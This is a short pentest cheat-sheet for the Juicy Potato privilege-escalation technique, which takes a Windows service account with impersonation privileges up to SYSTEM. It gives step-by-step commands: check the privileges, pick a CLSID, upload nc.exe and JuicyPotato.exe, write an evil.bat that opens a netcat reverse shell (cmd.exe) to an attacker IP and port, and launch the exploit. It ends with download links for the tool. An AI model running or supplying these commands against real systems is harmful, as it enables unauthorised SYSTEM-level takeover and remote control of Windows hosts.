# Juicy Potato
If you have any of "SeImpersonatePrivilege" or "SeAssignPrimaryTokenPrivilege" privileges, you can escalate from Windows Service Accounts to SYSTEM

## Exploiting
Check "SeImpersonatePrivilege" or "SeAssignPrimaryTokenPrivilege" privileges
```
whoami /priv
```

Detect OS version
```
systeminfo
```

Pick CLSID according to OS
```
https://github.com/ohpe/juicy-potato/tree/master/CLSID
```
upload nc.exe and juicypotato.exe to target machine. Then we will listen on the port with nc
```
echo "C:\windows\temp\nc.exe -e cmd.exe ATTACKER-IP ATTACKER-PORT" > evil.bat
```
```
juicypotato.exe -p "C:\Windows\Temp\evil.bat" -l 1337 -t * -c <CLSID>
```

### Download JuicyPotato.exe
```
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

### See also
* [Juicy Potato](https://github.com/ohpe/juicy-potato)
